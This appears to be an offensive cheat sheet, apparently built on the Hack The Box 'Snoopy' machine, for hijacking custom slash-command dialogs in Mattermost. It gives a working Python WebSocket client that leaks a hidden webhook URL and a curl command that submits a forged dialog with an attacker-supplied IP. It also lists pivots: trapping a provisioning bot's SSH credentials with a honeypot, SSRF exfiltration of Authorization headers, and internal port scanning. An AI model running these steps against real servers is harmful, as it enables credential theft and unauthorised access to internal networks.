# Mattermost Custom Slash-Command Dialog Hijack

## When this applies

- Authenticated as a low-priv user on a Mattermost instance.
- The team has a CUSTOM slash command (e.g. `/server_provision`, `/deploy`, `/run`) backed by an internal HTTP webhook.
- `GET /api/v4/commands?team_id=<TID>` returns the command but with empty `url` / `token` (only sysadmins see those — but `display_name`, `description`, and `auto_complete` are visible).
- When triggered, the command opens an INTERACTIVE DIALOG (the response body includes `Form submitted` or similar, and a `trigger_id`).

The hidden webhook URL and the dialog spec are sent to the user via WebSocket as an `open_dialog` event — even when the REST API redacts the URL. We can listen to the WebSocket and recover both, then submit the dialog with attacker-controlled fields directly to `/api/v4/actions/dialogs/submit`, bypassing any client-side validation.

## Recover the hidden webhook URL + dialog spec

```python
import socket, base64, os, json, struct, threading, time, urllib.request

TOKEN = "<MM_USER_ACCESS_TOKEN>"   # /api/v4/users/login response 'Token' header
HOST  = "mm.snoopy.htb"
IP    = "10.129.x.y"
TEAM_ID    = "<team_id>"
CHANNEL_ID = "<channel_id>"
COMMAND    = "/server_provision"

# --- minimal WebSocket client (raw, no library deps) ---
def ws_connect(ip, host, path):
    s = socket.create_connection((ip, 80))
    key = base64.b64encode(os.urandom(16)).decode()
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
               f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
               f"Sec-WebSocket-Version: 13\r\nOrigin: http://{host}\r\n\r\n").encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        buf += s.recv(4096)
    return s

def ws_send(s, txt):
    p = txt.encode(); n = len(p); m = os.urandom(4)
    masked = bytes(b ^ m[i % 4] for i, b in enumerate(p))
    if n <= 125:    h = bytes([0x81, 0x80 | n])
    elif n <= 0xFFFF: h = bytes([0x81, 0x80 | 126]) + n.to_bytes(2, "big")
    else:           h = bytes([0x81, 0x80 | 127]) + n.to_bytes(8, "big")
    s.sendall(h + m + masked)

def ws_recv(s, timeout=10):
    s.settimeout(timeout)
    h = b""
    while len(h) < 2: h += s.recv(2 - len(h))
    n = h[1] & 0x7F
    if n == 126:   n = int.from_bytes(s.recv(2), "big")
    elif n == 127: n = int.from_bytes(s.recv(8), "big")
    d = b""
    while len(d) < n:
        d += s.recv(min(4096, n - len(d)))
    return d.decode()

ws = ws_connect(IP, HOST, "/api/v4/websocket")
ws_send(ws, json.dumps({"seq": 1, "action": "authentication_challenge",
                        "data": {"token": TOKEN}}))

def trigger():
    time.sleep(1)
    req = urllib.request.Request(
        f"http://{IP}/api/v4/commands/execute", method="POST",
        data=json.dumps({"command": COMMAND,
                         "channel_id": CHANNEL_ID, "team_id": TEAM_ID}).encode(),
        headers={"Host": HOST, "Authorization": f"Bearer {TOKEN}",
                 "Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10)

threading.Thread(target=trigger, daemon=True).start()

for _ in range(30):
    msg = json.loads(ws_recv(ws))
    if msg.get("event") == "open_dialog":
        print(json.dumps(msg, indent=2))   # ← hidden URL + dialog spec
        break
```

The `open_dialog.data.dialog` is a JSON-encoded string; parse it and read `url`, `callback_id`, `state`, and `dialog.elements[]`.

## Submit the dialog with attacker-controlled values

```bash
curl -s -X POST -H "Host: mm.snoopy.htb" -H "Authorization: Bearer $TOKEN" \
  http://$IP/api/v4/actions/dialogs/submit \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://provisions.snoopy.htb:8579/hooks/serverprovision",
    "callback_id": "<from open_dialog>",
    "state": "<from open_dialog>",
    "channel_id": "'$CHANNEL_ID'",
    "team_id": "'$TEAM_ID'",
    "submission": {
      "email": "victim@target",
      "department": "engineering",
      "os": "linux",
      "ip_address": "<ATTACKER_IP>"
    }
  }'
```

A `200 {}` response means Mattermost accepted the submission and forwarded it server-side to the (internal) webhook URL. The plugin then performs whatever action the dialog drives — in Snoopy's case, an IT bot SSHes from the target to the IP we supplied.

## Pivot patterns

- **SSH honeypot trap.** Provisioning bots typically run `ssh user@<ip>` from inside the target network. Run a paramiko honeypot on the attacker IP at the chosen port — capture username + password.
- **Outbound SSRF / blind exfil.** If the dialog accepts a URL, point at attacker:80 to capture HTTP requests; combine with HTTP-to-HTTPS upgrade to grab Authorization headers.
- **Internal port scan.** When the dialog accepts arbitrary host:port, abuse it as a proxy to enumerate the internal network the bot can reach.

## Common pitfalls

- WebSocket handshake needs `Origin:` header — Mattermost otherwise returns HTTP 400.
- Some plugin webhooks validate `state` as a CSRF token; ALWAYS reuse the exact value from the `open_dialog` event.
- The dialog can have `select` elements with fixed `options` — but that constraint is client-side. Submit any value you want directly.
- The response to `/api/v4/commands/execute` may say `Form submitted` or similar — that's the plugin's user-facing acknowledgement, not failure. The actual webhook URL leak is on the WebSocket, not the REST response.
